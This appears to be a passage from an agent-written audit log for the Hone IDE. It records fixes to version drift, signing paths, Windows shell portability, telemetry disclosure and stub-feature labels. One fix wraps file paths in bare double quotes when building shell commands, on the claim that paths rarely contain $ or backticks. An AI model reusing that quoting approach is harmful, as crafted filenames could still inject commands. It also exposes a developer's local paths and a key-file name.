   - **Phase 0 Android version drift caught (2026-05-14):** following iteration found `android-build/app/build.gradle.kts` had `versionName = "1.0"` — same drift pattern as Info.plist. Fixed to `"0.1.0"`, extended verify-version to also probe the gradle file. **6 version sources now verified clean.** Search across `*.json *.toml *.kts perry.config.ts` confirms no other `1.0` literals where they shouldn't be.
   - **package.json file:../ dep path fix (2026-05-14):** workspace dep refs `file:../core` / `file:../editor` / `file:../terminal` don't match the actual sibling directory names `hone-core` / `hone-editor` / `hone-terminal`. The current `node_modules/@honeide/*` content must have been populated by a previous developer's local link setup; a fresh `bun install` from this checkout would have failed. Fixed to `file:../hone-core` / `file:../hone-editor` / `file:../hone-terminal` so installs work for any contributor cloning the monorepo following the followup.md layout convention.
   - **Bundle ID drift across config files (2026-05-14):** found 3 different bundle IDs in config: `com.hone.ide` (package.json, perry.toml, Info.plist — the canonical brand), `dev.hone.ide` (perry.config.ts), and `com.perry.Hone` (android-build/app/build.gradle.kts). Different builds would install with different app identities — macOS bundle from perry.toml vs perry.config.ts would conflict; Android build had a generic perry-template applicationId. Normalized all three to `com.hone.ide`. AndroidManifest's Java `package="com.perry.app"` left as-is since changing it requires moving the PerryActivity source file location (Java package convention) — applicationId is what matters for app identity / Play Store, package is the class namespace.
   - **Stale Perry version pin (2026-05-14):** `perry.config.ts` had `perry: '0.2.162'` but the actual installed perry is `0.4.40` — a major version jump (0.2 → 0.4). Perry tooling that reads this pin would warn or refuse compilation. Bumped to `0.4.40` to match the installed CLI. Worth noting: perry.toml doesn't have a perry-version pin (only project version), so config.ts is the only source for the compiler-version requirement.
   - **Previous-dev signing paths in perry.toml (2026-05-14):** 3 hardcoded absolute paths to a previous developer's machine: `google_play_key = "/Users/amlug/projects/gscmaster.com/searchbird-483214-a77c096cd7bb.json"`, `certificate = "/Users/amlug/.perry/distribution.p12"`, `provisioning_profile = "/Users/amlug/.perry/com_hone_ide.mobileprovision"`. These would fail for every other contributor (and shouldn't be in source control anyway — they're per-developer signing artifacts). Rewrote to repo-relative `.perry/` paths (already gitignored from iter 17) with a comment block explaining the local-override pattern + `HONE_GOOGLE_PLAY_KEY` / `HONE_APPLE_CERT_PATH` / `HONE_APPLE_PROFILE_PATH` env-var alternatives for CI. Signing identities (Apple Distribution string + Skelpo team ID + Windows gcloud_kms_key) stay since those are project-wide constants, not per-developer.
   - **Missing `assets/` directory referenced by perry.config.ts (2026-05-14):** perry.config.ts referenced `assets/icon.icns`, `assets/icon.xcassets`, `assets/icon.ico`, `assets/icon.svg`, `assets/hone.desktop`, `assets/icon-android/`, `assets/index.html` — none of which exist. The actual icon file is `hone-icon.png` at repo root. perry.toml correctly references that via `[project.icons]`; perry.config.ts had stale paths from a probably-never-populated asset pipeline. Rewrote every target's `icon:` to point at `hone-icon.png`; removed the missing `desktopFile`, `xcassets`, and web `spa.index` references. Per-platform pre-generated icons (icns/ico/xcassets) can be added back once the assets pipeline is built.
   - **Windows ARM64 update detection (2026-05-14):** `update-checker.ts::getPlatformKey` hardcoded `windows-x86_64` regardless of CPU arch — breaks auto-update for ARM64 Windows users (Surface Pro X, ARM-based Copilot+ PCs). Now reads `PROCESSOR_ARCHITECTURE` env var (Windows sets to `AMD64` for x64, `ARM64` for ARM64); maps to `windows-x86_64` or `windows-aarch64` accordingly. Fallback to `windows-x86_64` if env var is missing. Matches the `linux-aarch64` slot the original #116 audit added to releases.json — Windows ARM64 release artifact slot still needs to be added there for the round-trip to fully work.
   - **Windows update-install binary-path probing (2026-05-15):** `update-checker.ts::getBinaryPath` for Windows returned a hardcoded `'C:\\Program Files\\Hone\\hone-ide.exe'`. That breaks every Windows install variant except a system-wide install named exactly `hone-ide.exe`. Per-user installs to `%LOCALAPPDATA%\Programs\Hone\` (the modern Squirrel/Velopack/MSIX default that avoids the UAC prompt) returned the wrong path, so the update-installer would `Rename-Item` a non-existent file and silently fail. Now probes (in priority order): `$env:LOCALAPPDATA\Programs\Hone\Hone.exe`, `$env:LOCALAPPDATA\Programs\Hone\hone-ide.exe`, `$env:ProgramFiles\Hone\Hone.exe`, `$env:ProgramFiles\Hone\hone-ide.exe`, `${env:ProgramFiles(x86)}\Hone\Hone.exe`. Both binary names checked because dev builds use `--output hone-ide` (yielding `hone-ide.exe`) while Perry's appBundle.name is `Hone` (yielding `Hone.exe` in distributed installers). Legacy hardcoded path remains as final fallback. Build clean — verifier passed; link halted only on this host's missing perry_runtime.lib for Windows (pre-existing dev-env issue, unrelated). Follow-up: `process.execPath` (or a Perry FFI binding to `GetModuleFileNameW`) would be the canonical solution — Perry stdlib doesn't currently expose either; probe-list works for now.
   - **paths.ts subprocess-fork eliminations + cmd.exe `pwd` fallback (2026-05-15):** three drift fixes in `src/workbench/paths.ts`. (a) `getHomeDir()` on macOS/Linux now reads `process.env.HOME` first before falling back to `execSync('/bin/echo $HOME')`; on Windows it reads `process.env.USERPROFILE` first before falling back to `execSync('echo %USERPROFILE%')`. Avoids a subprocess fork on every call — `getHomeDir` is invoked from many code paths (every `getAppDataDir`, `getChatsDir`, etc.), so cumulative wins. The earlier iter 26 fix to `getTempDir` already used `process.env`; this harmonizes `getHomeDir` with the same pattern. (b) `getCwd()` fallback was hardcoded to `execSync('pwd')` — `pwd` is POSIX-only; cmd.exe doesn't know it, so on Windows when `process.cwd()` somehow returned empty, the fallback would throw and `getCwd` would return `''`. Now branches on `__platform__`: Windows runs `execSync('cd')` (cmd.exe builtin that prints the working directory with no args), POSIX still runs `pwd`. (c) The subprocess fallbacks themselves are preserved as a last resort in case Perry runtime doesn't expose `process.env` on some target — defense in depth.
   - **Debug auto-pair/auto-test marker paths cross-platform (2026-05-15):** `render.ts` had ~12 hardcoded `/tmp/hone-auto-pair`, `/tmp/hone-auto-pair-guest`, `/tmp/hone-auto-test`, `/tmp/hone-auto-test-result.log` literals. These are debug hooks: a developer/test-runner `touch`-es the marker file before launching the IDE to trigger automated sync-pair or UI-test flows. On Windows `/tmp` doesn't exist as a path the OS understands without a POSIX layer (WSL/Cygwin), so none of these checks ever fired on Windows builds — the debug-test pathway was silently macOS/Linux-only. Now every reference uses `getTempDir() + '/hone-auto-...'`, which resolves to `/tmp/` on POSIX and `$env:TEMP` (typically `C:\Users\<user>\AppData\Local\Temp`) on Windows via the iter 26 `getTempDir` fix. Updated 12 references (auto-pair: 3, auto-test: 9 incl. all `*-result.log` reads/writes). External test runners that touch these markers need to use `[System.IO.Path]::GetTempPath()` (PowerShell) or `os.environ['TEMP']` (Python) on Windows to write to the right location; the IDE side now reads consistently across platforms. Comments updated to document the convention.
   - **Claude Code shell command POSIX-only — Windows-broken (2026-05-15):** the most serious Windows-breakage found this loop. `claude-process.ts::startClaudeSession` and `render.ts` (claude relay-host path) both built a shell command shaped like `unset CLAUDECODE; <bin> -p "$(cat <promptFile>)" ...` and piped it through `cmd.exe /c` on Windows. Two POSIX-only constructs make this unrecognized by cmd.exe: (1) `unset` is not a cmd.exe builtin (the env-var-clear equivalent is `set "VAR="`), and (2) `$(cat <file>)` command substitution doesn't exist in cmd.exe (it would be interpreted literally and passed as the `-p` argument). Net effect: Claude Code did not work at all on Windows builds — every chat send would either fail to spawn or pass garbage to claude. Now both call sites branch on `__platform__`: Windows uses `set "CLAUDECODE=" && <bin> -p <shellEscape(prompt)>` (inlining the prompt directly via the existing platform-aware shellEscape which wraps in double quotes and doubles internal `"`s); POSIX keeps `unset CLAUDECODE; ... $(cat <file>)` to avoid argv-size limits for very long prompts. The temp prompt file is still written on both platforms for parity (POSIX cats it; Windows ignores it — left in place because cleanup code at session end already handles both). Trade-off documented in comments: Windows is subject to cmd.exe's ~8192-char argv cap, so extremely long prompts may exceed argv where POSIX succeeded via cat indirection — typical chat prompts fit fine.
   - **POSIX shell-cmd unquoted paths in lsp-bridge fallback (2026-05-15):** `lsp-bridge.ts::startFallbackDiagnostics` POSIX branch built `cd ' + lspWorkspaceRoot + ' && npx tsc ... > ' + DIAG_LOG_FILE + ' 2>&1; touch ' + DIAG_DONE_FILE` — none of the interpolated paths were quoted. Workspaces under `~/My Documents/...` or any path with spaces would shell-break: `cd /Users/Foo/My Documents` parses as `cd /Users/Foo/My` with `Documents` as a stray argv. The Windows branch already used `"..."` quotes correctly; the POSIX side did not. Now all three interpolations (`lspWorkspaceRoot`, `DIAG_LOG_FILE`, `DIAG_DONE_FILE`) are wrapped in double quotes. Comment notes that double-quotes are deliberate because `cd '...'` with single quotes inside an outer single-quoted TS string would require literal escaping and there's no shell expansion to suppress in these paths.
   - **debug-panel buildRunCommand paths unquoted (2026-05-15):** continuing the unquoted-path sweep from the previous fix — `debug-panel.ts::buildRunCommand` (the "Run File" / "Run-N-Watch" feature for the debug pane) had 8 language branches and **every single one** interpolated `filePath` (and in the Rust/C/C++ branches `debugBin`/`cargoRoot`) into a shell command without quoting. Examples: `bun run /Users/Foo/My Project/script.ts`, `rustc /path with spaces/foo.rs -o /tmp/hone-debug-bin && /tmp/hone-debug-bin`, `cd <cargoRoot with spaces> && cargo run`. On Windows the issue is amplified by hardware-typical paths under `C:\Users\<Name>\` with literal spaces in OneDrive folders, Documents subfolders, etc. Fixed by introducing local `qFile = '"' + filePath + '"'` and `qBin = '"' + debugBin + '"'` constants at the top of `buildRunCommand` and using them in all 8 language branches; the Rust cargo-root branch interpolates `cargoRoot` with explicit `'"'` wrapping inline. Double quotes preserve the path as one argv token in both `cmd.exe` and POSIX `/bin/sh`, and filesystem paths essentially never contain `$`/backtick/`\\` characters that double-quotes would interpret. Comment added explaining the quoting rationale. Unrelated follow-ups noted in code: (a) `cc`/`c++` invocations don't resolve on stock Windows installs — users need MSYS2 or MinGW; same kind of toolchain-presence assumption that already applies to `cargo` on systems without Rust installed, so leaving as best-effort. (b) `bash` for `.sh` files won't run on stock Windows either — Git for Windows or WSL provides it. Both deferred to a future "tooling presence" pass.
   - **Clean-audit pass (2026-05-15):** swept the remaining unaudited modules for shell-command, subprocess, hardcoded-path, and platform-conditional drift: `notifications`, `sync-host`, `sync-transport`, `chat-panel` (env-var fallback + osascript/powershell prompts), `tasks-panel` (`spawnBackground` argv-form via `getTempDir()`), `marketplace-browser` (curl argv-form), `extensions-panel` (no shell ops), `plugins.ts` (callback-driven, no shell), `setup-screen`, `ui-helpers` (monoFont + setIconButton + unicodeForSymbol — all properly platform-branched), `settings.ts` / `settings-panel.ts` (no shell ops, `terminalShell` wired to terminal-panel default per platform), `native-menu.ts` (no platform shortcuts, all routing via menu IDs), `git-log.ts` (argv-form), `agent-state.ts` (no shell), `find-bar` (no shell ops), `lsp/hover-popup.ts` (no shell). Net: no new drift found. The 13-iter run (#28 → #41) appears to have caught the load-bearing Windows-portability issues in the TS layer. Remaining classes of concern that aren't TS-side: Perry's spawnSync argv-form Win32 quoting (relies on the Perry runtime correctly building `lpCommandLine` from argv array — depends on Perry-stdlib behavior, out of scope here); `cmd`/`move`/`mv` argv-passthrough in explorer context-menu rename (same Perry-runtime question; the existing argv pattern matches Node.js conventions and works empirically per recent commits); third-party tooling presence (cargo / cc / bash) which is a documentation issue not a code issue. Loop continues, but the productive seam has narrowed; next iters should pivot to either UI/visual concerns or to actually running the built binary on Windows to confirm runtime behavior matches the static fixes.
   - **Agentic test scripts unrunnable on PS 5.1 (2026-05-15):** the iter-26 Windows ports of `tests/agentic/setup.ps1` and `teardown.ps1` would have failed for the first user on the first run — three independent bugs all rooted in PowerShell 5.1's defaults vs. PowerShell 7's. (a) **Em-dash encoding trap**: scripts contain `—` (em-dash, U+2014) in comments and the `geisterhand CLI not found in PATH — external server skipped` warning. The files are UTF-8-without-BOM. PS 5.1 (Windows PowerShell, the default on Windows) reads BOM-less files as ANSI/Windows-1252, which sees the UTF-8 em-dash bytes (E2 80 94) as `â??"` garbage, then the parser hits an unbalanced string-terminator and dies before line 1 of actual execution. Verified by `[System.Management.Automation.Language.Parser]::ParseFile` returning 4 syntax errors on the pre-fix file. Fixed by globally replacing `—` → `--` in both scripts (5 occurrences total). ASCII-only PS scripts work on every PowerShell version regardless of file encoding. (b) **`Add-Content`/`Set-Content` UTF-16 LE default**: PS 5.1 writes these as UTF-16 LE with BOM by default. The seed files in `tests/agentic/setup/seed-files/` are UTF-8. After setup.ps1 ran `Add-Content -Path src\main.ts -Value '// modified line added for testing'`, the resulting file would be split-encoding (UTF-8 prefix + UTF-16 LE suffix or full re-encoded UTF-16), and `git status` would show the entire file as modified instead of a one-line append — breaking the "Modified: src/main.ts" assertion that all scenarios depend on. Fixed by adding `-Encoding utf8` to the three Set-Content/Add-Content calls. Comment added explaining the why. (c) **Locale-fragile timestamp parse**: `[int][double]::Parse((Get-Date -UFormat %s))` parses with the current invariant culture. On de-DE / fr-FR / sv-SE etc. systems where the decimal separator is `,`, `[double]::Parse('1715798400')` throws (because Parse expects culture-specific format). Replaced with `[DateTimeOffset]::Now.ToUnixTimeSeconds()` which returns an `Int64` directly — no parsing, no culture dependency. Both scripts now parse cleanly per `Parser.ParseFile` (verified with zero errors).
   - **Agentic test orchestrator Windows-doc gaps (2026-05-15):** continuing the agentic-test thread — `tests/agentic/run-all.md` (the orchestrator instructions for an LLM agent driving the test run) had several Unix-only references that the iter-26 Windows port had missed. (a) **Teardown invocation** only showed the bash version; added a `.\teardown.ps1` Windows equivalent paralleling the existing setup section. (b) **Troubleshooting commands** used `lsof -i :7676` for port-check — `lsof` doesn't exist on stock Windows. Added Windows-PowerShell parallels for the two port-checks: `Get-NetTCPConnection -LocalPort 7676 -ErrorAction SilentlyContinue` (the cmdlet that returns owning-process info for a listening port on Windows 8.1+). (c) **Keyboard-shortcut example** in troubleshooting used `{"key":"b","modifiers":["cmd"]}` — `cmd` is the macOS Command key; Windows/Linux equivalents use `"ctrl"`. Added a note explaining the platform mapping. (d) **Embedded sub-agent prompt** (the verbatim text the orchestrator pastes to the agent that does the actual test driving) used `/tmp/test/` hardcoded paths throughout. Added a PATHS section at the top of the embedded prompt explicitly directing the agent to substitute `$env:TEMP\hone-test\` on Windows, and to use `"ctrl"` instead of `"cmd"` for modifier keys. (e) **New troubleshooting entry** added for the PS 5.1 setup.ps1 encoding trap discovered in the previous iter, so future contributors who hit a parse error get the diagnostic immediately. Also caught (but deferred — too big for this iter): `release.yml::build-windows` only produces a single `Hone-*.exe` artifact via `mv dist/Hone-*.exe ...` but perry.config.ts declares Windows arches `['x86_64', 'aarch64']`; either `perry publish windows` ships one fat binary, or only x86_64 is being produced today and the iter-36 `windows-aarch64` getPlatformKey branch has nothing to download. This is the architectural pair to the iter-36/37 ARM64 fixes — needs coordinated effort across `perry publish`, `release.yml` filename pattern, and `hone-auth/releases.json` slot. Documented as v1.1 follow-up.
   - **README.md / DEVELOPING.md / WINDOWS_PORT_NOTES.md doc accuracy pass (2026-05-15):** three docs had stale or shell-incorrect Windows build instructions that the iter-43 perry-binary-finding-blocker investigation made it possible to rewrite accurately. (a) **README.md** Windows section was tagged ```bash` but contained `mv hone-ide hone-ide.exe` and `./hone-ide.exe` — `mv` is Unix, `./` is mostly Unix-or-PowerShell-only (cmd.exe doesn't recognize the leading `./`), and perry already auto-appends `.exe` on Windows targets so the rename was redundant. Split into separate PowerShell and cmd.exe blocks with correct path prefixes (`.\hone-ide.exe` for PS, bare `hone-ide.exe` for cmd) and removed the redundant rename step. (b) **DEVELOPING.md TL;DR** showed `bash setup.sh` / `bash teardown.sh` for the agentic harness with no Windows variant — added a PowerShell-tagged block right after with `.\setup.ps1` / `.\teardown.ps1`, plus a one-line pointer to `WINDOWS_PORT_NOTES.md` for the full Windows build flow. (c) **WINDOWS_PORT_NOTES.md** build instructions assumed in-tree dev (perry source next to hone-ide), which is fine for the project's setup but didn't help users with `cargo install`'d / Homebrew / winget perry where the source-tree target dir isn't accessible. Restructured as Option A (in-tree) + Option B (installed perry + `PERRY_RUNTIME_DIR` env var) with explicit PowerShell vs bash invocation forms. Added a note that perry 0.4.40's released binary lacks the env-var override (it's in current source) so users on the released version may need to reinstall from source via `cargo install --path crates/perry --force` — same blocker iter 43 hit when trying to compile locally. The docs now match the actual current state of the toolchain instead of an idealized version.
7. **[P0] No CI workflow.** `.github/workflows/` doesn't exist. Release builds are local-only.
   - **Phase 8 done (2026-05-12):** `.github/workflows/ci.yml` runs the per-package test matrix on every push + PR: hone-core / hone-editor / hone-terminal / hone-relay / hone-build on macOS-14 + ubuntu-latest via Bun; hone-themes via Jest on ubuntu; hone-extensions via Vitest; hone-api typecheck-only. Separate `version-consistency` job runs `scripts/verify-version.ts`. Release pipeline in `.github/workflows/release.yml` (see #5) handles signed builds on tag push.
   - **Phase 8 actually done in hone-ide (2026-05-13):** the prior claim covered cross-repo CI but `hone-ide/.github/workflows/ci.yml` itself didn't exist. Wrote it: `version-consistency` job runs `scripts/verify-version.ts`, `typecheck` job runs `bun run typecheck` and filters out the pre-existing project-wide noise (perry/i18n, @honeide/.../perry/live, the Editor/ViewportManager method-misses, the `t3`/`t5` timing-log refs, the clipboardWrite/widgetSetTooltip declarations). Two `perry-compile-{macos,windows}` jobs scaffolded with `if: false` for when the perry runner image is published. Release builds remain in `release.yml`.
8. **[P0] No `LICENSE` at repo root.** `hone-brand/` has one but the IDE itself doesn't. Done: add explicit license file (or "all rights reserved" notice if proprietary) — required before publishing binaries.
   - **Phase 0 done (2026-05-13):** MIT LICENSE file added to `hone-ide/LICENSE` matching the text of `hone-editor/LICENSE` (copyright "Hone IDE", year 2025). The original "Done" claim in the snapshot was a Mac-side phantom — `ls LICENSE*` returned nothing in hone-ide on Windows when this loop audited. Now genuinely present.
9. **[P0] Telemetry to third party without disclosed privacy policy.** `telemetry.ts` posts to `https://api.chirp247.com/api/v1/events`. Code claims "no PII" but ships device ID + platform + layout.
   - **Phase 0 done (2026-05-12):** desktop/iOS already default off; web default flipped 1→0 in `settings.ts:209`; setup-screen disclosure (`setup-screen.ts:399`) now names Chirp and links to the policy; privacy policy stub written at `landing/privacy.html`; gate (`_telemetryEnabled < 1`) verified privacy-preserving (no events fire before consent or before restart after opt-in).
   - **Phase 0 device-ID display done (2026-05-13):** Settings → Privacy now has a `Device ID` row showing the first 8 chars of the user's device ID with a `Copy` button (full ID via `clipboardWrite`). Row description: "Anonymous identifier sent with telemetry events. Email support@hone.codes with this ID to request deletion." Closes the deletion-request UX so users can act on the privacy promise.
   - **Still needed before ship:** legal review of `landing/privacy.html`; deploy to `hone.codes/privacy`.

### False advertising / mislabeled features

10. **[P0] AI inline completion is a local snippet engine, not model-backed.** `views/ai-inline/inline-completion.ts:113` uses `generateLocalSuggestion` (closing braces, block bodies) and never calls a provider. Copilot/Cursor parity claim is unsupported.
   - **Phase 6 honest framing done (2026-05-12):** kept the local heuristic engine as-is but stripped the "AI" framing from every user-visible surface. Settings UI now reads "Snippet Hints" + "Suggest closing braces and block bodies after the cursor. Local heuristics only — no AI provider call. Model-backed completion in v1.1." Section header changed from "AI Features" to "Editor Features". Source file's module docstring documents the scope honestly. Setting keys (`aiInlineCompletionEnabled` / `aiInlineCompletionDelay`) kept for back-compat with existing settings.ini files. Wiring `hone-core/src/ai/inline/completion-provider.ts` for real FIM completion remains the v1.1 work.
11. **[P0] "Debug" panel is "Run" mislabeled.** `views/debug/debug-panel.ts:678-689` has step-over stubs whose body is a comment ("In a real implementation, send DAP next request"). Breakpoints stored in `bpFiles[]/bpLines[]` are cosmetic — never sent to a debugger. `dap-manager.ts` exists in core but `hone-ide` never imports it.
   - **Phase 5 honest framing done (2026-05-12):** panel header renamed from "RUN AND DEBUG" to "RUN" with subtitle "Breakpoints + step controls are v1.1. Today this runs the file." Source docstring documents the v1.0 scope: local `execSync(buildRunCommand(...))` only, no DAP adapter spawn or transport. Step/breakpoint buttons stay (no-ops without a debugger attached) so the muscle memory works once v1.1 wires DAP — at which point only the docstring + header revert.
12. **[P0] Marketplace install is a mock.** `hone-extension/marketplace/src/client.ts:134` returns `'downloaded-plugin'` literal with comment "In a real implementation". No download, verify, extract, or activate.
   - **Phase 5 honest framing done (2026-05-12):** Install button relabeled `Preview (v1.1)`. Clicking a non-built-in entry now surfaces "Marketplace install lands in v1.1. Browse and review until then." instead of silently downloading a placeholder. Built-in extensions still register their own enable handlers and work as before. The full pipeline (download → sha256 verify → signature verify → extract → register) remains for v1.1.
13. **[P0] PR review panel is a 78-line stub.** `views/pr-review/pr-review-panel.ts:38` shows "PR list will appear when GitHub API is connected" placeholder. `hone-core/src/ai/review/` engine + `git/platform/{github,gitlab,bitbucket}.ts` exist but only build request descriptors — no HTTP execution. Done: implement OAuth flow + actual API calls, or remove the panel for v1.
   - **Phase 6 honest framing done (2026-05-13):** the panel rewrite (~50 LOC, down from 78) drops the fake token field + "PR list will appear" lie. Header reads `PULL REQUESTS · Coming in v1.1`; body documents that the review engine and per-platform request descriptors are in hone-core but the HTTP execution path + OAuth device flow haven't shipped. Includes a Tip line pointing users to `gh pr list` in the integrated terminal as the v1 bridge. Once the HTTP path lands (and OAuth device flow is implemented), the message gets swapped for the live PR list and the gating disappears. Matches the same honest-scope pattern as #10/#11/#12.
14. **[P0] Sync review queue + trust settings are orphaned.** `views/sync/review-panel.ts` (372 LOC) and `views/sync/trust-settings.ts` (204 LOC) have zero importers in the codebase. The reviewed/accept/reject "killer differentiator" from MVP-CHECKLIST B13/B14 cannot run. Done: wire both into `sync-panel.ts`, or descope sync to "passive file mirror" for v1.
   - **Phase 7 done (2026-05-13):** sync-panel imports `buildTrustSettings` + `buildReviewPanel` and mounts both under a collapsed `▸ Advanced` section. First click lazily builds both widgets; subsequent clicks flip visibility. **buildReviewPanel rewrite to fix the Perry verifier error:** the original direct-closure pattern (`Button('Accept All', () => { _acceptAllCallback(); })`) captures the module-level let by value at button creation, which (a) breaks the callback wiring (later `setReviewCallbacks` doesn't update the captured value) and (b) tripped Perry's AOT verifier. Rewrote to use the same closure-via-named-function pattern as git-panel: `Button('Accept All', () => { onAcceptAllPressed(); })` where `onAcceptAllPressed` is a module-level function that reads the current callback value. Also moved `ScrollView(reviewContainer)` to the explicit `scrollViewSetChild` form. Both panels now compile clean — verified by `perry compile --target windows`. The 575 orphaned LOC is now reachable.
   - **v1.1-prep cleanup (2026-05-13):** also rewrote `refreshReviewPanel`, `buildGroupCard`, `buildProposalCard`, `buildConflictCard` — even though they're currently dead code (only reached via the still-unwired `setProposals` / `setUndoConflicts` exports). Replaced the `(reviewColors.editorBackground as unknown as number[])[0] || 0.15` cast-hex-as-RGB hack with `setBg(card, reviewColors.editorBackground)` which routes through the existing `hexToRGBA` helper. Replaced `propStatuses[i] === 'pending'` (broken `===` on dynamic strings per CLAUDE.md) with a hand-rolled `isPendingStatus(s)` doing length+charCodeAt match. Replaced direct-closure callback captures with a `_pendingX` + `dispatchX` indirection that reads module-level callbacks at call time. Removed the obsolete inline `acceptProposal`/`rejectProposal`/etc helpers that were a dead-code copy of the same patterns. Net result: when v1.1 wires `sync-host` → `setProposals`, the whole module compiles without hitting the verifier.

### Critical missing UI

15. **[P0] Command palette has no UI.** `view.commandPalette` is in `menu.ts:103`, `commands.ts:123`, and a keybinding, but the handler is empty and no overlay renderer exists. Discoverability for everything else hinges on this.
   - **Phase 2 done (2026-05-12):**
     - New view module `hone-ide/src/workbench/views/command-palette/command-palette.ts` (~140 LOC). API: `initCommandPalette(sidebar, onClose)`, `openCommandPalette(colors)`, `closeCommandPalette()`, `isCommandPaletteOpen()`. Reads `getPaletteCommands()` from the existing registry, substring-filters by title or category (case-insensitive), caps the list at 200 items, shows empty-state for zero matches, and routes Enter / click through `executeCommand(id)`.
     - Exported `showCommandPaletteAction` from `render.ts`; on close it restores the file explorer.
     - `initCommandPalette(sidebarContainer, restoreSidebarAfterPalette)` is wired at app startup right after `initNotifications`.
     - `native-menu.ts` `dispatchCommand` adds a branch for `view.commandPalette` (length 19, `'v','c'` at positions 0/5). Both the menu and the Cmd+Shift+P native shortcut now reach the palette.
   - **Phase 8 polish:** the v1 palette reuses the sidebar-takeover pattern (same as `goToFileAction`). Moving it to a floating centered overlay is a polish task once the IDE has a generic overlay container.

---

## P1 — Major (VS Code parity for v1)

### Editor / syntax highlighting

16. **[P1] Replace `KeywordSyntaxEngine` with tree-sitter or TextMate grammars.** `hone-editor/core/tokenizer/keyword-syntax-engine.ts` is a 1033-line single-color keyword scanner. C/C++ literally reuses the Rust keyword table (`line 129-130`). No JSX, template literals, regex, decorators, type params.
   - **Phase 1 done (2026-05-12):**
     - Added 6 FFI exports in `tree_sitter_bridge.rs`: `hone_editor_ts_parse(source, langId)`, `_ts_clear`, `_ts_token_count`, `_ts_token_start`, `_ts_token_end`, `_ts_token_scope`. Parse results held in `thread_local!` so subsequent accessors avoid pointer round-tripping. String I/O via `perry_ffi::alloc_string` / `str_from_header`.
     - Registered all 6 in `hone-editor/package.json` `perry.nativeLibrary.functions` (params/returns types match Perry's f64/i64 convention).
     - Added `declare function` declarations in `hone-editor/perry/editor-component.ts`.
     - New TS engine `core/tokenizer/tree-sitter-engine.ts` implements `ISyntaxEngine` — parses once per buffer version (cached); `getLineTokens` slices the cached token array by byte range and resolves scopes through the active theme.
     - `cargo build --lib` clean; hone-editor tests run unchanged (389 pass; the 2 pre-existing fails — perry/ui import in tests + code folding — were on the known-expected list).
   - **Still in Phase 1:**
     - **Grammar set expanded 2026-05-12:** active set is now TypeScript, TSX, JavaScript, Python, Rust, JSON, CSS (`scss`/`less` route through the CSS grammar). Each has hand-rolled scope_for_* mapping with `keyword.control`, `string.quoted`, `constant.numeric`, `entity.name.function`, `entity.name.class`, `entity.name.type`, `variable.other.property`, `entity.other.attribute-name.{class,id}`, `support.type`, etc.
     - **Deferred to next grammar bump:** Go, HTML, Markdown — their crates.io crates pin tree-sitter 0.20 which conflicts with our 0.22 lockstep. Move when we adopt tree-sitter ≥ 0.24 or build them from upstream sources. YAML, TOML, SQL, C, C++, Java, Swift, Shell, Ruby on the same follow-up.
     - **Still TODO:** swap hand-rolled `scope_for_*` for tree-sitter `HIGHLIGHTS_QUERY` `.scm` files (bundled with every grammar crate); port `tree_sitter_bridge.rs` to iOS / Windows / Linux native crates (depends on `perry-ffi` being available on those platforms — same source compiles); wire incremental reparse (`parser.parse(source, Some(&old_tree))` for edit-time perf).
   - **Composite engine + IDE wiring (2026-05-12):** `core/tokenizer/composite-engine.ts` routes per-language between `TreeSitterEngine` and `KeywordSyntaxEngine`. `perry/editor-component.ts` constructs the composite by default and pushes the new `EditorTheme` into the ViewModel on `setThemeMode` — so #19's `tokenCache.invalidateAll()` fires through.
17. **[P1] Rust live tokenizer hardcodes VS Code Dark + TypeScript only.** `native/macos/src/tokenizer.rs:10-17` has `COLOR_KEYWORD: &str = "#569cd6"` etc., and only knows TS keywords. Every keystroke in any other language retokenizes with wrong vocabulary, and every non-VS-Code-dark theme is broken while editing.
   - **Phase 1 done (2026-05-13):** `tokenizer.rs` is now per-language (8 keyword tables: TS, JS, Python, Rust, Go, Swift, Java, C/C++) and theme-aware. Two new FFI exports: `hone_editor_set_tokenizer_language(id)` and `hone_editor_set_token_colors(keyword, string, comment, variable, type, function, number, default)` (RGB hex encoded as f64 to avoid string allocation in the FFI). Active language + palette live in `thread_local!` cells; `tokenize_line` snapshots both once per call. Python lines comment with `#` instead of `//`. `cargo build --lib` clean.
   - **TS-side push wired (2026-05-13):** `Editor.setLanguage(...)` calls `hone_editor_set_tokenizer_language(tokenizerLangId(id))` so on-keystroke retokenization uses the right keyword table. `Editor.setThemeMode(...)` calls `hone_editor_set_token_colors(...)` with the active theme's `tokens.{keyword,string,comment,variableName,typeName,functionName,number}` plus `foreground` for default. Hex strings parsed locally via `hexToInt` so no string allocation hits the FFI bridge. The Rust live tokenizer now matches the TS/scope renderer's appearance across all 8 languages on theme change.
18. **[P1] Tokens carry baked colors instead of TextMate scopes.** `KeywordSyntaxEngine` emits `LineToken{color, fontStyle}` with `theme.foreground` baked at tokenize time. Result: `token-theme.ts`'s TextMate scope resolver is dead code; 15 themes' `tokenColors` arrays are ignored at runtime.
   - **Phase 1 done (2026-05-12):** added `resolveTokenScope(theme, scope)` in `core/tokenizer/token-theme.ts`. Walks dot-separated TextMate scopes longest-prefix-first across the full TextMate scope vocabulary the new engine emits — comment/string/regex/keyword.{control,operator}/storage.*/entity.name.{function,class,type,namespace,tag,label}/entity.other.attribute-name/variable.{parameter,language,other.property,other.constant}/punctuation/support.{function,class,type,constant,variable}/markup.{heading,bold,italic,underline.link,inserted,deleted,changed}/meta.tag/meta/invalid/constant.{numeric,language,character.escape}. New `TreeSitterEngine.getLineTokens` calls it on each scoped token slice. Result: switching themes only needs to repaint (Phase 1 #19) — tokens carry scope strings, not baked colors.
19. **[P1] Re-tokenize on theme change.** No caller invokes `vm.invalidateTokens()` on `onThemeChange`. Theme switch only repaints UI chrome.
   - **Phase 1 done (2026-05-12):** `EditorViewModel.setTheme()` (`view-model/editor-view-model.ts:813`) now calls `this.tokenCache.invalidateAll()` after assigning the new theme. Combined with the scope-based resolver (#18), the next `getLineTokens` call re-resolves scopes through the new theme without retokenizing — re-parse is free because token kinds are theme-independent.
   - **Still in Phase 1:** `editor-component.ts` needs to construct `TreeSitterEngine` (instead of the legacy `KeywordSyntaxEngine`) for languages tree-sitter supports, and the IDE's `onThemeChange` listener (`hone-ide/src/workbench/theme/theme-loader.ts:278`) needs to push the new `EditorTheme` into each live `Editor` instance via `editor.setTheme(...)`. Both are small wires; deferred to the next iteration.
